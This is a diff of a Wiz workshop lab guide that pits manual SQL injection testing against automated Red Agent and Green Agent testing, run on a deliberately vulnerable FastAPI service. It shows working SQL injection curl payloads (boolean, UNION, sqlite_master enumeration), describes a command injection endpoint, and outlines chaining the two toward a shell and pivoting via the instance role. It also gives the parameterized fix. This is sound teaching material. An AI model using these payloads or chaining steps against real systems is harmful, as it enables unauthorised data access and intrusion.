@@ -1,253 +1,227 @@
-# **Phase 1: Manual Penetration Testing (Wiz-Enhanced)** 🔍
+# Wiz Security Lab: Manual vs. Agentic Penetration Testing
 
-### **Objective**
-Manually identify and exploit the SQL injection vulnerability using Wiz intelligence to guide your penetration testing strategy.
+A self-paced lab that walks through finding and remediating the same vulnerability
+two ways:
+
+- **Section 1 — Manual:** Traditional penetration testing, guided by Wiz intelligence.
+- **Section 2 — Agentic:** Automated testing and remediation with Red Agent and Green Agent.
+
+## Lab Setup
+
+You will use **two separate Wiz tenants**, both logged in via Wiz Backoffice:
+
+| Tenant | Used in | Capabilities |
+|--------|---------|--------------|
+| Tenant 1 | Section 1 | Standard Wiz (Inventory, SAST, Security Graph, Issues) |
+| Tenant 2 | Section 2 | Red Agent + Green Agent enabled |
+
+Both tenants scan the same AWS account, so in both you filter on the same
+subscription: **`TF-AWS-Connector-AgentWorkshop`**.
+
+### The Target
+
+A deliberately vulnerable FastAPI service (`code-challenge-backend`) running on
+ECS-on-EC2. It exposes two intentionally insecure endpoints:
+
+- `GET /api/users?username=…` — SQL injection (CWE-89)
+- `GET /api/execute?command=…` — OS command injection (CWE-78)
+
+The data lives in an in-memory SQLite database seeded with three users.
 
 ---
 
-### **Step 1: Wiz-Powered Target Identification**
+## Section 1: Manual Penetration Testing with Wiz Intelligence
 
-**Use Wiz to find your attack surface:**
+**Tenant:** Tenant 1 · **Goal:** Use Wiz to find, exploit, and triage the SQL
+injection — letting Wiz intelligence drive the attack instead of blind probing.
 
-**In Wiz Portal:**
-1. Navigate to: **Inventory → Cloud Resources**
+### Step 1 — Identify the Target
+
+1. Go to **Inventory → Cloud Resources**.
 2. Filter:
-   - Subscription = `TF-AWS-Connector-CodeChallange`
+   - Subscription = `TF-AWS-Connector-AgentWorkshop`
    - Type = `VIRTUAL_MACHINE`
-3. Find: the EC2 host tagged `Name = code-challenge-backend`
+3. Open the EC2 host tagged `Name = code-challenge-backend`.
 
-**Question:** What is the public IP / DNS of the EC2 host?
-**Answer:** *(Copy from Wiz resource details — the app listens directly on port 8000; there is no load balancer)*
+Copy its **public IP / DNS** from the resource details. The app listens directly
+on **port 8000** — there is no load balancer in front of it.
 
-**Alternative - Use Wiz Graph Search:**
+> Mika shortcut: *"Show me all publicly exposed virtual machines in subscription
+> TF-AWS-Connector-AgentWorkshop."*
 
-```
-Ask Mika: "Show me all publicly exposed virtual machines in subscription TF-AWS-Connector-CodeChallange"
-```
+### Step 2 — Review What Wiz SAST Already Knows
 
----
+Go to **Code Security → SAST Findings** and filter:
 
-### **Step 2: Leverage Wiz SAST Intelligence**
+- Repository = `wiz-demo/summit-code-challenge-backend`
+- Severity = HIGH, CRITICAL · Status = OPEN
 
-**Before testing, review what Wiz already knows:**
+Wiz has already scanned the source and flagged three issues:
 
-**Navigate to:** Code Security → SAST Findings
+| Vulnerability | CWE | Location |
+|---|---|---|
+| SQL Injection | CWE-89 | `app/main.py:27` — unparameterized query on `GET /api/users` |
+| OS Command Injection | CWE-78 | `app/main.py:35-41` — `subprocess.Popen(…, shell=True)` on `GET /api/execute` |
+| Insecure CORS | — | `app/main.py:10-16` — `allow_origins=["*"]` with `allow_credentials=True` |
 
-**Filter:**
-- Repository: `wiz-demo/summit-code-challenge-backend`
-- Severity: HIGH, CRITICAL
-- Status: OPEN
+Open the SQL Injection finding to see the exact line, the vulnerable snippet, and
+its OWASP mapping (A03:2021). You'll use this in Step 5.
 
-**Question:** What vulnerabilities did Wiz SAST detect?
-**Answer:**
-1. ✅ **SQL Injection** (CWE-89) - `app/main.py:27` (unparameterized SQL query on `GET /api/users`)
-2. ⚠️ **OS Command Injection** (CWE-78) - `app/main.py:35-41` (`GET /api/execute` passes input to `subprocess.Popen(..., shell=True)`)
-3. ⚠️ **Insecure CORS** - `app/main.py:10-16` (`allow_origins=["*"]` with `allow_credentials=True`)
+### Step 3 — Map Code to Runtime
 
-**Click on the SQL Injection finding to see:**
-- Exact file path and line number
-- Vulnerable code snippet
-- CWE classification (CWE-89)
-- OWASP mapping (A03:2021)
+Confirm what is actually deployed from this repository.
 
-**Pro Tip:** Use this intelligence to craft targeted payloads!
+Go to **Code to Cloud → Correlations**, or ask Mika:
+*"Show me all cloud resources deployed from repository wiz-demo/summit-code-challenge-backend."*
 
----
-
-### **Step 3: Map Code to Runtime with Wiz**
-
-**Understand what's actually deployed:**
-
-**Ask Mika:**
-
-```
-"Show me all cloud resources deployed from repository wiz-demo/summit-code-challenge-backend"
-```
-
-**Or navigate to:** Code to Cloud → Correlations
-
-**Question:** Which container image was built from this repository?
-**Answer:** `800618367342.dkr.ecr.us-east-1.amazonaws.com/code-challenge-backend:<git-sha>`
-*(Terraform tags the image with the 12-char git short SHA of the deployed commit — see `infra/aws/image.tf`)*
-
-**Question:** Where is this container running?
-**Answer:**
+- **Image:** `800618367342.dkr.ecr.us-east-1.amazonaws.com/code-challenge-backend:<git-sha>`
+  (Terraform tags each image with the 12-character git short SHA of the deployed commit.)
 - **Cluster:** `code-challenge` (ECS on EC2)
 - **Capacity provider:** `code-challenge-ec2` (single-instance ASG)
-- **Task family / image:** `code-challenge-backend` (the container name inside the task definition is `backend`)
+- **Task family:** `code-challenge-backend` (the container inside the task is named `backend`)
 
-**Use Wiz to find the container:**
+### Step 4 — Analyze Network Exposure
 
-```
-Navigate to: Inventory → Containers
-Filter: Name contains "code-challenge-backend"
-```
+Understand the path from the internet to the container before attacking.
 
----
-
-### **Step 4: Wiz Network Exposure Analysis**
-
-**Before attacking, understand the network path:**
-
-**Ask Mika:**
+Go to **Security Graph → Network Exposure** and filter on
+Exposed Entity = `code-challenge-backend`, or ask Mika:
+*"Show me the network exposure path for container code-challenge-backend."*
 
 ```
-"Show me the network exposure path for container code-challenge-backend"
+Internet (0.0.0.0/0:8000)
+  → EC2 host security group (code-challenge-backend)
+  → ECS task (bridge network, hostPort 8000)
+  → container (backend)
 ```
 
-**Or use Graph Search:**
+Port 8000 is open to the world directly on the EC2 host.
 
-```
-"Find all publicly exposed containers in subscription TF-AWS-Connector-CodeChallange"
-```
+### Step 5 — Exploit the SQL Injection
 
-**Question:** How is the backend container exposed to the internet?
-**Answer:**
-
-```
-Internet (0.0.0.0/0:8000) → EC2 host security group (code-challenge-backend)
-→ ECS task (bridge network, hostPort 8000) → container (backend)
-```
-
-**Verify exposure in Wiz:**
-- Navigate to: **Security Graph → Network Exposure**
-- Filter: Exposed Entity = `code-challenge-backend`
-
----
-
-### **Step 5: Wiz-Guided Vulnerability Testing**
-
-**Now that you know WHAT and WHERE, test the HOW:**
-
-**From Wiz SAST finding, you know:**
-- **File:** `app/main.py`
-- **Line:** 27
-- **Vulnerability:** Unparameterized SQL query
-- **Pattern:** Direct string concatenation in SQL
-
-**Click "View Code" in Wiz to see the vulnerable code:**
+From the SAST finding you know the vulnerable code at `app/main.py:27`:
 
 ```python
-# Line 27 - VULNERABLE CODE (from Wiz SAST)
-query = "SELECT id, username, email, role FROM users WHERE username = '"+username+"'"
+query = "SELECT id, username, email, role FROM users WHERE username = '" + username + "'"
 rows = sqlite_db.execute(query).fetchall()
 ```
 
-Note the backend uses an **in-memory SQLite** database, the query returns
-**4 columns** (`id, username, email, role`), and the vulnerable parameter is the
-`username` **query string** on `GET /api/users` — there is no login endpoint.
+Key facts that shape the payloads:
 
-**Based on this intelligence, craft your attack:**
+- Database is **in-memory SQLite** (use `sqlite_version()`, not `@@version`).
+- The query selects **4 columns** — UNION payloads must return 4 columns.
+- The injectable parameter is the `username` **query string** on `GET /api/users`.
 
 ```bash
-# Get the EC2 host public IP from Wiz (host:port, no load balancer)
-ENDPOINT="<EC2_PUBLIC_IP_FROM_WIZ>:8000"
+# Target the EC2 host directly (host:port, no load balancer)
+ENDPOINT="<EC2_PUBLIC_IP>:8000"
 
-# Test 1: Confirm the endpoint is accessible
+# Confirm the service is reachable
 curl -I "http://$ENDPOINT/"
 
-# Test 2: Benign baseline — look up a single user
-curl --get "http://$ENDPOINT/api/users" \
-  --data-urlencode "username=alice"
+# Benign baseline — a single user
+curl --get "http://$ENDPOINT/api/users" --data-urlencode "username=alice"
 
-# Test 3: SQL Injection - Boolean-based (returns every user)
-curl --get "http://$ENDPOINT/api/users" \
-  --data-urlencode "username=' OR '1'='1"
+# Boolean-based — returns every user
+curl --get "http://$ENDPOINT/api/users" --data-urlencode "username=' OR '1'='1"
 
-# Test 4: SQL Injection - UNION-based (must match the 4 selected columns)
+# UNION-based — must match the 4 selected columns
 curl --get "http://$ENDPOINT/api/users" \
   --data-urlencode "username=' UNION SELECT 1,sqlite_version(),3,4-- "
 ```
 
-**Question:** Which payload successfully exploited the SQL injection?
-**Answer:** *(Document your successful payload)*
+### Step 6 — Correlate with Wiz Issues
+
+Go to **Issues → Risk Issues** and filter on `code-challenge-backend` (or search
+"SQL Injection"). Wiz correlates the SAST finding with runtime exposure into a
+single prioritized issue:
+
+```
+CRITICAL — SQL Injection in a Publicly Exposed Container
+  SAST:     Unparameterized SQL query (app/main.py:27)
+  Exposure: Internet-accessible on the EC2 host (0.0.0.0/0:8000)
+  Risk:     Data breach / unauthorized access
+```
+
+### Step 7 — Assess the Blast Radius
+
+Use the Security Graph (or Mika: *"What other resources have access to the same
+data as code-challenge-backend?"*) to map what an attacker reaches next.
+
+The SQLite data is in-process, but the **same host also exposes
+`GET /api/execute`** (command injection). Chaining SQL injection → command
+injection gives shell access as the container user, from which the EC2 instance
+role becomes the next pivot.
 
 ---
 
-### **Step 6: Wiz-Enhanced Exploitation**
+## Section 2: Agentic Testing & Remediation
 
-**Use Wiz to understand the data at risk:**
+**Tenant:** Tenant 2 (Red Agent + Green Agent enabled) · **Goal:** Have the agents
+discover, exploit, and remediate the same vulnerability automatically — then
+compare the result against your manual work.
 
-**Navigate to:** Data Security → Data Findings
+Switch to Tenant 2 via Wiz Backoffice. It scans the same account, so filter on
+the same subscription: `TF-AWS-Connector-AgentWorkshop`.
 
-**Filter:**
-- Resource: Container `code-challenge-backend`
-- Or: Subscription = `TF-AWS-Connector-CodeChallange`
+### Step 1 — Red Agent: Automated Discovery & Exploitation
 
-**Question:** What sensitive data does Wiz detect in this environment?
-**Answer:** *(Check for PII, credentials, financial data)*
+Go to **Attack Surface → Red Agent** and open the results for
+`code-challenge-backend`.
 
-**Now extract that data using SQL injection (SQLite syntax):**
+Review what the agent produced on its own:
 
-```bash
-# Database version (SQLite — use sqlite_version(), not @@version)
-curl --get "http://$ENDPOINT/api/users" \
-  --data-urlencode "username=' UNION SELECT 1,sqlite_version(),3,4-- "
+- The vulnerabilities it discovered, including the SQL injection.
+- The **Evidence** for each finding — the exact payloads it sent and the
+  responses it got back, used to prove successful exploitation.
+- The data it managed to extract.
 
-# Enumerate tables (SQLite — use sqlite_master, not information_schema)
-curl --get "http://$ENDPOINT/api/users" \
-  --data-urlencode "username=' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'-- "
+Compare this to Section 1: how complete is the agent's finding set, and how long
+did it take versus your manual testing?
 
-# Dump the schema of the users table
-curl --get "http://$ENDPOINT/api/users" \
-  --data-urlencode "username=' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='users'-- "
+### Step 2 — Green Agent: Automated Remediation
 
-# Dump all user records (id, username, email, role — there is no password column)
-curl --get "http://$ENDPOINT/api/users" \
-  --data-urlencode "username=' OR '1'='1"
+Open the SQL injection issue and review the **Green Agent** analysis:
+
+- Root-cause / investigation steps.
+- The recommended remediation, including the specific code change — replacing the
+  string-concatenated query with a parameterized one:
+
+```python
+# Vulnerable
+query = "SELECT id, username, email, role FROM users WHERE username = '" + username + "'"
+
+# Fixed
+query = "SELECT id, username, email, role FROM users WHERE username = ?"
+rows = sqlite_db.execute(query, (username,)).fetchall()
 ```
+
+Compare Green Agent's plan to the fix you would have written manually.
+
+### Step 3 — Manual vs. Agentic
+
+With both sections done, weigh the two approaches:
+
+| Aspect | Manual (Section 1) | Agentic (Section 2) |
+|---|---|---|
+| Time to find the vulnerability | | |
+| Completeness of findings | | |
+| Exploitation evidence | | |
+| Remediation guidance | | |
+| Scales across many apps | | |
+
+Manual testing brings business-logic context and judgment; the agents bring speed,
+repeatable evidence, and scale. In practice they complement each other — agents
+for continuous coverage, humans for the nuanced cases.
 
 ---
 
-### **Step 7: Wiz Issue Correlation**
+## Wrap-Up
 
-**Check if Wiz already flagged this as a security issue:**
-
-**Navigate to:** Issues → Risk Issues
-
-**Filter:**
-- Resource: `code-challenge-backend`
-- Or: Search for "SQL Injection"
-
-**Ask Mika:**
-
-```
-"Show me all security issues for container code-challenge-backend"
-```
-
-**Question:** Did Wiz create a security issue for this vulnerability?
-**Answer:** *(Check if there's an issue combining SAST finding + exposure)*
-
-**Typical Wiz Issue:**
-
-```
-🔴 CRITICAL: SQL Injection in Publicly Exposed Container
-- SAST Finding: Unparameterized SQL Query (app/main.py:27)
-- Exposure: Internet-accessible directly on the EC2 host (0.0.0.0/0:8000)
-- Risk: Data breach, unauthorized access
-- Affected Resource: code-challenge-backend
-```
-
----
-
-### **Step 8: Wiz-Powered Impact Analysis**
-
-**Use Wiz to assess the blast radius:**
-
-**Ask Mika:**
-
-```
-"What other resources have access to the same data as code-challenge-backend?"
-```
-
-**Or use Graph Search:**
-
-```
-"Find all resources with access to the same database as container code-challenge-backend"
-```
-
-**Question:** If this SQL injection is exploited, what else is at risk?
-**Answer:** *(Use Wiz graph to map lateral movement possibilities. Note: the SQL
-data lives in an in-process SQLite DB, but the same host also exposes the
-`GET /api/execute` command-injection endpoint — chain it for shell access as the
-container's user, then pivot via the instance role.)*
+- Wiz intelligence (SAST, Code-to-Cloud, Network Exposure, Issues) turns blind
+  pentesting into targeted, evidence-driven testing.
+- Red Agent reproduces that discovery-and-exploitation flow automatically, with
+  full request/response evidence.
+- Green Agent turns a finding into a concrete, reviewable code fix.
+- The strongest program combines both: agents for scale and consistency, people
+  for context and edge cases.
